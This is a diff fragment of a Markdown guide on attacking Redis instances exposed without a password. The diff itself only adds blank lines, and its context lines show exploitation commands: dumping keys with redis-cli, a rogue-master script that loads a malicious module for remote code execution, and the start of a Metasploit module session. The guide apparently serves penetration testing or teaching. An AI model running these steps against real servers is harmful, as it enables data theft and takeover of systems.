@@ -44,6 +44,7 @@ When a Redis service is inadvertently exposed to external networks without passw
 ## Exploitation Walkthroughs
 
 ### Vector 1: Reconnaissance & In-Memory Data Exfiltration
+
 Connect to the unauthenticated Redis daemon using `redis-cli` or `nc`:
 
 ```bash
@@ -59,6 +60,7 @@ redis-cli -h 127.0.0.1 -p 6379 keys "*"
 ```
 
 ### Vector 2: Rogue Dynamic Module Remote Code Execution
+
 Starting in Redis 4.0, Redis introduced the Module API, allowing developers to load custom `.so` C libraries. If an attacker simulates a Redis Master using a rogue server, they can sync a compiled shared library to the victim and execute commands directly:
 
 ```bash
@@ -72,6 +74,7 @@ python3 /tmp/redis-rogue/redis-master.py -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 21
 The exploit spins up a temporary fake master on port 21000, instructs the victim to replicate from it, uploads `exp.so`, and loads the module to execute the payload.
 
 ### Vector 3: Metasploit Rogue Module Exploit
+
 ```bash
 msfconsole -q
 use exploit/linux/redis/redis_replication_cmd_exec
